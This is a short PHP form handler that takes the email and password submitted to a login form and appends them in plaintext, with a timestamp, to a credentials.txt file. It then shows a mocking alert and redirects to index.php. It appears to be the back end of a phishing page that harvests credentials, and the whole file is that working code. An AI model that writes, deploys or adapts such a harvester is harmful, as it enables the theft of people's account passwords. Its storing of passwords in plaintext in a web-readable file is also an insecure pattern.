<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
     // Get the current timestamp in the desired format
    $timestamp = date('Y-m-d H:i:s'); // e.g., 2025-03-12 12:43:00

    // Define the file path (ensure the file is writable)
    $file = 'credentials.txt';

    // Append the email and password to the file
    $data = "Email: $email, Password: $password | Timestamp: $timestamp\n";
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Optional: Redirect back or show success message
    echo "<script>alert('Hmmmmmm! (SMH)'); window.location.href='index.php';</script>";
    exit();
} else {
    // If not a POST request, redirect to the main page
    header("Location: index.php");
    exit();
}
?>
